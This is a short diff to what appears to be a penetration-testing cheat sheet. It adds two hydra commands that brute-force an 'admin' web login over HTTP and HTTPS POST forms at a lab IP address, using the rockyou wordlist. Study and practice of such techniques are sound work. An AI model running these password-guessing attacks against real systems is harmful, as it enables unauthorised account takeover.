@@ -8,6 +8,10 @@ hydra -l user -P passwords.txt ftp://<target-ip>
 
 ```shell
 hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -s 80 IP_HOST http-head
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
 ```
 
 - Brute force ssh:
